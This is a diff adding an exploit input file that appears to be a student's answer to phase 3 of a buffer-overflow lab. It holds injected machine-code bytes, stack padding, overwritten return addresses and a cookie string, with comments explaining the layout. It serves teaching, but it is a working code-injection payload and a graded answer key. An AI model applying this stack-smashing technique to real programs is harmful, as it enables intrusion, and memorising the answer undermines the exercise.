@@ -1,0 +1,18 @@
+48 c7 c7 20 22 63 55 c3   /*rsp + 0x10, add c3, the return address, to end; counts as first 8 bytes of buffer */
+
+/* buffer */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* %rsp -  0x38, from phase 2; reversed for little endian */
+d8 21 63 55 00 00 00 00
+
+/* touch 3; reversed for little endian */
+c6 14 40 00 00 00 00 00
+
+/* cookie as a string; convert each hex value to the ASCII representation; null char (00) at end */
+36 36 30 35 61 62 35 31 00
